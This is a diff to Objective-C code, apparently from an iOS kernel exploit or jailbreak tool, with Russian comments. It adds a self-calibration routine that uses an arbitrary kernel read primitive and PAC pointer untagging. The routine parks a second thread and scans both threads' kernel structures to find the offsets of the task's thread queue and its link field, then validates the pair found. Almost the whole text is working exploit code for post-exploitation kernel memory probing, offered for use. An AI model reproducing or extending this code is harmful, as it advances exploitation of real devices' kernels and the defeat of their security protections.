@@ -4997,6 +4997,14 @@ static void kpPacLive(NSString *line)
     [h closeFile];
 }
 
+static volatile uint64_t g_kppark_stop = 0;
+static void *kpParkWorker(void *arg)
+{
+    (void)arg;
+    while (!g_kppark_stop) usleep(5000);
+    return NULL;
+}
+
 + (NSString *)pacTestReport
 {
     NSMutableString *r = [NSMutableString string];
@@ -5069,28 +5077,56 @@ static void kpPacLive(NSString *line)
         for (uint32_t o = 0x300; o <= 0x400; o += 8)
             [dumpTh appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(threadVA + o)];
         pacnote(dumpTh);
-        // валидатор вместо прогулок по живой очереди: head.next → thread,
-        // обратная ссылка thread→tro(+0x3E8)→tro_task(+0x28) должна == selfTask.
-        // гонкам мутации очереди это безразлично.
+        // Эмпирическая кросс-разметка: второй припаркованный тред. Ищем
+        // A+l == B+l (соседние звенья одной очереди) и поля таска,
+        // указывающие прямо в наши thread_t.
         uint32_t taskQ = 0, linkQ = 0;
-        for (uint32_t h = 0x40; h <= 0xC0 && !taskQ; h += 8) {
-            uint64_t A = kp_untag_ptr(kp_rc_kread64(selfTask + h));
-            if (!kpLooksLikeKernelPointer(A)) continue;
-            pacnote([NSString stringWithFormat:@"  h=0x%x: A=%#llx", h, A]);
-            for (uint32_t l = 0x300; l <= 0x410; l += 8) {
-                uint64_t thr = A - l;
-                uint64_t tro2 = kp_untag_ptr(kp_rc_kread64(thr + 0x3E8));
-                if (!kpLooksLikeKernelPointer(tro2)) continue;
-                uint64_t tsk = kp_untag_ptr(kp_rc_kread64(tro2 + 0x28));
-                pacnote([NSString stringWithFormat:@"    l=0x%x: thr=%#llx tro=%#llx tsk=%#llx%@",
-                         l, thr, tro2, tsk, (tsk == selfTask) ? @" ← MATCH" : @""]);
-                if (tsk == selfTask) {
-                    taskQ = h; linkQ = l;
-                    pacnote([NSString stringWithFormat:@"  ВАЛИДНО: task.threads=0x%x link=0x%x", taskQ, linkQ]);
-                    break;
+        g_kppark_stop = 0;
+        pthread_t pb;
+        uint64_t thrB = 0;
+        if (pthread_create(&pb, NULL, kpParkWorker, NULL) == 0) {
+            pthread_detach(pb);
+            usleep(2000);
+            thrB = [self rcResolveThreadKVA:pthread_mach_thread_np(pb)];
+        }
+        pacnote([NSString stringWithFormat:@"  parked thread B=%#llx", thrB]);
+        if (thrB) {
+            for (uint32_t l = 0x300; l <= 0x500; l += 8) {
+                uint64_t vA = kp_untag_ptr(kp_rc_kread64(threadVA + l));
+                uint64_t vB = kp_untag_ptr(kp_rc_kread64(thrB + l));
+                if (vA >= thrB && vA < thrB + 0x800) {
+                    pacnote([NSString stringWithFormat:@"  A+%#x → B+%#llx%@", l, vA - thrB,
+                              (vA - thrB) == l ? @" ← ЛИНК" : @""]);
+                    if ((vA - thrB) == l && !linkQ) linkQ = l;
+                }
+                if (vB >= threadVA && vB < threadVA + 0x800) {
+                    pacnote([NSString stringWithFormat:@"  B+%#x → A+%#llx%@", l, vB - threadVA,
+                              (vB - threadVA) == l ? @" ← ЛИНК" : @""]);
+                    if ((vB - threadVA) == l && !linkQ) linkQ = l;
                 }
             }
+            for (uint32_t t = 0x40; t <= 0x140; t += 8) {
+                uint64_t v = kp_untag_ptr(kp_rc_kread64(selfTask + t));
+                const char *who = NULL; uint64_t base = 0;
+                if (v >= threadVA && v < threadVA + 0x800) { who = "A"; base = threadVA; }
+                else if (v >= thrB && v < thrB + 0x800) { who = "B"; base = thrB; }
+                if (who) {
+                    pacnote([NSString stringWithFormat:@"  task+%#x → %s+%#llx ← ГОЛОВА?", t, who, v - base]);
+                    if (!taskQ) taskQ = t;
+                }
+            }
+            // валидация пары: head.next-thread должен вести на свой таск
+            if (taskQ && linkQ) {
+                uint64_t A0 = kp_untag_ptr(kp_rc_kread64(selfTask + taskQ));
+                uint64_t thr0 = A0 - linkQ;
+                uint64_t tro0 = kp_untag_ptr(kp_rc_kread64(thr0 + 0x3E8));
+                uint64_t tsk0 = kp_untag_ptr(kp_rc_kread64(tro0 + 0x28));
+                pacnote([NSString stringWithFormat:@"  проверка: thr0=%#llx tsk0=%#llx%@", thr0, tsk0,
+                          (tsk0 == selfTask) ? @" ← ПАРА ВЕРНАЯ" : @" — пара неверна, сброс"]);
+                if (tsk0 != selfTask) { taskQ = 0; linkQ = 0; }
+            }
         }
+        g_kppark_stop = 1;
         pacnote([NSString stringWithFormat:@"  self-calib: task.threads=0x%x link=0x%x %@", taskQ, linkQ,
                   taskQ ? @"" : @"— НЕ ПОДОБРАЛИ (стоп)"]);
         if (taskQ) {
